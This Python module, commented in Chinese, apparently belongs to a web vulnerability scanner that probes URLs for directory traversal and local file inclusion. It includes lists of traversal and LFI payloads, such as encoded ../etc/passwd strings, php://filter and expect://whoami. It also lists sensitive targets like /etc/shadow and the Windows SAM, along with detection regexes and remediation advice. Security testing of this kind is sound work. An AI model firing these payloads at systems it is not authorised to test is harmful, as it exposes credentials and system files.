#!/usr/bin/env python3
"""
目錄遍歷漏洞掃描模組
檢測路徑遍歷和檔案包含漏洞
"""

import asyncio
import logging
import time
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse, quote, unquote
import aiohttp

logger = logging.getLogger(__name__)

class DirectoryTraversalScanner:
    """目錄遍歷漏洞掃描器"""

    def __init__(self):
        self.name = "Directory Traversal Scanner"
        self.description = "Directory traversal and path traversal vulnerability scanner"

        # 目錄遍歷負載
        self.traversal_payloads = [
            # 基本負載
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '../../../windows/win.ini',
            '../../../../../../etc/passwd',
            '..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',

            # 編碼負載
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',
            '..%252f..%252f..%252fetc%252fpasswd',

            # 雙重編碼
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts',

            # NULL 字節
            '../../../etc/passwd%00',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00',
            '../../../etc/passwd%00.jpg',

            # 混合路徑
            './../../../etc/passwd',
            '.\\..\\..\\.\\windows\\system32\\drivers\\etc\\hosts',
            '//../../etc/passwd',

            # 絕對路徑
            '/etc/passwd',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            '/windows/win.ini',
        ]

        # 敏感檔案清單
        self.sensitive_files = [
            # Linux/Unix
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/proc/version',
            '/proc/self/environ',
            '/etc/apache2/apache2.conf',
            '/etc/nginx/nginx.conf',
            '/root/.bash_history',
            '/var/log/apache2/access.log',
            '/var/log/auth.log',

            # Windows
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            'C:\\windows\\win.ini',
            'C:\\boot.ini',
            'C:\\windows\\system32\\config\\sam',
            'C:\\windows\\repair\\sam',
            'C:\\inetpub\\logs\\LogFiles\\W3SVC1\\ex*.log',

            # 應用配置檔案
            'config.php',
            'database.php',
            'wp-config.php',
            '.env',
            'settings.py',
            'application.properties',
            'web.config',
        ]

        # 檔案包含負載
        self.lfi_payloads = [
            'php://filter/convert.base64-encode/resource=index.php',
            'php://input',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
            'expect://whoami',
            'file:///etc/passwd',
        ]

        # 檢測模式
        self.detection_patterns = {
            'linux_passwd': [
                r'root:.*:0:0:',
                r'daemon:.*:1:1:',
                r'bin:.*:2:2:',
                r'sys:.*:3:3:',
                r'nobody:.*:65534:'
            ],
            'windows_hosts': [
                r'127\.0\.0\.1\s+localhost',
                r'::1\s+localhost',
                r'# Copyright.*Microsoft Corp',
            ],
            'windows_ini': [
                r'\[fonts\]',
                r'\[extensions\]',
                r'for 16-bit app support',
            ],
            'config_files': [
                r'<?php',
                r'define\(',
                r'DB_PASSWORD',
                r'mysql_connect',
                r'PDO\(',
                r'SECRET_KEY',
            ]
        }

    async def scan(self, session: aiohttp.ClientSession, target, urls: List[str]) -> List[Any]:
        """
        執行目錄遍歷掃描

        Args:
            session: HTTP 客戶端會話
            target: 掃描目標配置
            urls: 要掃描的 URL 列表

        Returns:
            List[VulnerabilityResult]: 發現的漏洞列表
        """
        vulnerabilities = []

        logger.info(f"開始目錄遍歷掃描，目標 URLs: {len(urls)}")

        for url in urls:
            try:
                # 參數型目錄遍歷
                param_vulns = await self._scan_parameter_traversal(session, url)
                vulnerabilities.extend(param_vulns)

                # 路徑型目錄遍歷
                path_vulns = await self._scan_path_traversal(session, url)
                vulnerabilities.extend(path_vulns)

                # 本地檔案包含 (LFI)
                lfi_vulns = await self._scan_lfi(session, url)
                vulnerabilities.extend(lfi_vulns)

                # Cookie 型目錄遍歷
                cookie_vulns = await self._scan_cookie_traversal(session, url)
                vulnerabilities.extend(cookie_vulns)

                await asyncio.sleep(0.1)

            except Exception as e:
                logger.error(f"目錄遍歷掃描 URL {url} 時發生錯誤: {str(e)}")
                continue

        logger.info(f"目錄遍歷掃描完成，發現 {len(vulnerabilities)} 個潛在漏洞")
        return vulnerabilities

    async def _scan_parameter_traversal(self, session: aiohttp.ClientSession, url: str) -> List[Any]:
        """掃描參數型目錄遍歷"""
        vulnerabilities = []

        # 如果 URL 包含參數
        if '?' in url:
            base_url, query_string = url.split('?', 1)
            params = {}

            # 解析參數
            for param_pair in query_string.split('&'):
                if '=' in param_pair:
                    key, value = param_pair.split('=', 1)
                    params[key] = unquote(value)

            # 測試每個參數
            for param_name, original_value in params.items():
                param_vulns = await self._test_parameter_traversal(
                    session, base_url, params, param_name
                )
                vulnerabilities.extend(param_vulns)

        return vulnerabilities

    async def _test_parameter_traversal(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        params: Dict[str, str],
        param_name: str
    ) -> List[Any]:
        """測試特定參數的目錄遍歷"""
        vulnerabilities = []

        for payload in self.traversal_payloads[:10]:  # 限制測試數量
            try:
                # 準備測試參數
                test_params = params.copy()
                test_params[param_name] = payload

                # 構建測試 URL
                query_string = '&'.join([f"{k}={quote(str(v))}" for k, v in test_params.items()])
                test_url = f"{base_url}?{query_string}"

                async with session.get(test_url, timeout=10) as response:
                    content = await response.text()

                    # 檢查是否成功讀取敏感檔案
                    file_type, evidence = self._detect_file_content(content)
                    if file_type:
                        vulnerability = self._create_vulnerability_result(
                            title=f"目錄遍歷漏洞 - 參數 '{param_name}'",
                            description=f"透過參數 '{param_name}' 檢測到目錄遍歷漏洞，成功讀取 {file_type} 檔案。",
                            severity="high",
                            affected_url=test_url,
                            request_method="GET",
                            request_payload=f"{param_name}={payload}",
                            response_evidence=evidence,
                            cwe_id="CWE-22",
                            owasp_category="A01:2021 – Broken Access Control"
                        )
                        vulnerabilities.append(vulnerability)
                        break  # 找到一個成功的就足夠了

            except Exception as e:
                logger.debug(f"參數遍歷測試錯誤: {str(e)}")
                continue

        return vulnerabilities

    async def _scan_path_traversal(self, session: aiohttp.ClientSession, url: str) -> List[Any]:
        """掃描路徑型目錄遍歷"""
        vulnerabilities = []

        parsed_url = urlparse(url)
        base_path = parsed_url.path.rstrip('/')

        # 測試在路徑末尾添加遍歷負載
        for payload in self.traversal_payloads[:8]:
            try:
                # 構建測試路徑
                test_path = f"{base_path}/{payload}"
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{test_path}"

                if parsed_url.query:
                    test_url += f"?{parsed_url.query}"

                async with session.get(test_url, timeout=10) as response:
                    content = await response.text()

                    # 檢查是否成功讀取敏感檔案
                    file_type, evidence = self._detect_file_content(content)
                    if file_type:
                        vulnerability = self._create_vulnerability_result(
                            title=f"路徑遍歷漏洞",
                            description=f"透過路徑操作檢測到目錄遍歷漏洞，成功讀取 {file_type} 檔案。",
                            severity="high",
                            affected_url=test_url,
                            request_method="GET",
                            request_payload=payload,
                            response_evidence=evidence,
                            cwe_id="CWE-22",
                            owasp_category="A01:2021 – Broken Access Control"
                        )
                        vulnerabilities.append(vulnerability)
                        break

            except Exception as e:
                logger.debug(f"路徑遍歷測試錯誤: {str(e)}")
                continue

        return vulnerabilities

    async def _scan_lfi(self, session: aiohttp.ClientSession, url: str) -> List[Any]:
        """掃描本地檔案包含漏洞"""
        vulnerabilities = []

        # 如果 URL 包含參數，測試 LFI
        if '?' in url:
            base_url, query_string = url.split('?', 1)
            params = {}

            for param_pair in query_string.split('&'):
                if '=' in param_pair:
                    key, value = param_pair.split('=', 1)
                    params[key] = unquote(value)

            # 測試 LFI 負載
            for param_name in params.keys():
                for payload in self.lfi_payloads[:5]:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload

                        query_string = '&'.join([f"{k}={quote(str(v))}" for k, v in test_params.items()])
                        test_url = f"{base_url}?{query_string}"

                        async with session.get(test_url, timeout=10) as response:
                            content = await response.text()

                            # 檢查 LFI 成功指標
                            if self._detect_lfi_success(content, payload):
                                vulnerability = self._create_vulnerability_result(
                                    title=f"本地檔案包含漏洞 - 參數 '{param_name}'",
                                    description=f"透過參數 '{param_name}' 檢測到本地檔案包含漏洞。",
                                    severity="critical",
                                    affected_url=test_url,
                                    request_method="GET",
                                    request_payload=f"{param_name}={payload}",
                                    response_evidence=content[:300],
                                    cwe_id="CWE-98",
                                    owasp_category="A03:2021 – Injection"
                                )
                                vulnerabilities.append(vulnerability)
                                break

                    except Exception as e:
                        logger.debug(f"LFI 測試錯誤: {str(e)}")
                        continue

        return vulnerabilities

    async def _scan_cookie_traversal(self, session: aiohttp.ClientSession, url: str) -> List[Any]:
        """掃描 Cookie 型目錄遍歷"""
        vulnerabilities = []

        # 常見的可能受影響的 cookie 名稱
        cookie_names = ['file', 'page', 'template', 'include', 'path', 'src', 'document']

        for cookie_name in cookie_names:
            for payload in self.traversal_payloads[:5]:
                try:
                    # 設定測試 cookie
                    cookies = {cookie_name: payload}

                    async with session.get(url, cookies=cookies, timeout=10) as response:
                        content = await response.text()

                        # 檢查是否成功讀取敏感檔案
                        file_type, evidence = self._detect_file_content(content)
                        if file_type:
                            vulnerability = self._create_vulnerability_result(
                                title=f"Cookie 目錄遍歷漏洞 - '{cookie_name}'",
                                description=f"透過 Cookie '{cookie_name}' 檢測到目錄遍歷漏洞。",
                                severity="medium",
                                affected_url=url,
                                request_method="GET",
                                request_payload=f"Cookie: {cookie_name}={payload}",
                                response_evidence=evidence,
                                cwe_id="CWE-22",
                                owasp_category="A01:2021 – Broken Access Control"
                            )
                            vulnerabilities.append(vulnerability)
                            break

                except Exception as e:
                    logger.debug(f"Cookie 遍歷測試錯誤: {str(e)}")
                    continue

        return vulnerabilities

    def _detect_file_content(self, content: str) -> tuple[Optional[str], str]:
        """檢測檔案內容類型"""
        content_lower = content.lower()

        # 檢查 Linux passwd 檔案
        for pattern in self.detection_patterns['linux_passwd']:
            if re.search(pattern, content):
                return 'passwd', content[:200]

        # 檢查 Windows hosts 檔案
        for pattern in self.detection_patterns['windows_hosts']:
            if re.search(pattern, content, re.IGNORECASE):
                return 'hosts', content[:200]

        # 檢查 Windows ini 檔案
        for pattern in self.detection_patterns['windows_ini']:
            if re.search(pattern, content, re.IGNORECASE):
                return 'win.ini', content[:200]

        # 檢查配置檔案
        for pattern in self.detection_patterns['config_files']:
            if re.search(pattern, content):
                return 'config', content[:200]

        # 檢查是否包含檔案系統資訊
        file_indicators = [
            'root:x:0:0:',  # passwd 檔案
            '[fonts]',      # win.ini
            '# hosts',      # hosts 檔案
            'define(',      # PHP 配置
            'SECRET_KEY',   # Django 設定
        ]

        for indicator in file_indicators:
            if indicator.lower() in content_lower:
                return 'sensitive_file', content[:200]

        return None, ""

    def _detect_lfi_success(self, content: str, payload: str) -> bool:
        """檢測 LFI 成功指標"""
        # 檢查 PHP filter 輸出
        if 'php://filter' in payload:
            # Base64 編碼內容通常表示成功
            if re.search(r'^[A-Za-z0-9+/=]+$', content[:100]):
                return True

        # 檢查是否回應了原始碼
        if '<?php' in content:
            return True

        # 檢查命令執行結果
        if 'expect://' in payload and len(content.strip()) > 0:
            return True

        # 檢查 data:// 協議執行結果
        if 'data://' in payload and 'phpinfo' in content:
            return True

        return False

    def _create_vulnerability_result(self, **kwargs):
        """創建漏洞結果對象"""
        from core.scanner_engine import VulnerabilityResult

        return VulnerabilityResult(
            id=f"dir_traversal_{int(time.time())}",
            title=kwargs.get('title', 'Directory Traversal Vulnerability'),
            description=kwargs.get('description', ''),
            severity=kwargs.get('severity', 'high'),
            cwe_id=kwargs.get('cwe_id', 'CWE-22'),
            owasp_category=kwargs.get('owasp_category', 'A01:2021 – Broken Access Control'),
            affected_url=kwargs.get('affected_url', ''),
            request_method=kwargs.get('request_method', 'GET'),
            request_payload=kwargs.get('request_payload', ''),
            response_evidence=kwargs.get('response_evidence', ''),
            remediation=self._get_remediation_advice(),
            risk_score=self._calculate_risk_score(kwargs.get('severity', 'high')),
            confidence="likely",
            timestamp=time.strftime('%Y-%m-%d %H:%M:%S')
        )

    def _calculate_risk_score(self, severity: str) -> float:
        """計算風險評分"""
        risk_scores = {
            'critical': 9.5,
            'high': 8.0,
            'medium': 5.5,
            'low': 3.0
        }
        return risk_scores.get(severity, 6.0)

    def _get_remediation_advice(self) -> str:
        """獲取修復建議"""
        return """
修復建議:
1. 對所有檔案路徑輸入進行嚴格驗證
2. 使用白名單方式限制可訪問的檔案和目錄
3. 避免直接使用使用者輸入構建檔案路徑
4. 使用 realpath() 或類似函數正規化路徑
5. 設定適當的檔案系統權限
6. 在 chroot jail 或容器中運行應用程式
7. 禁用危險的 PHP 函數 (如 file_get_contents, include)
8. 實施檔案類型和擴展名驗證
"""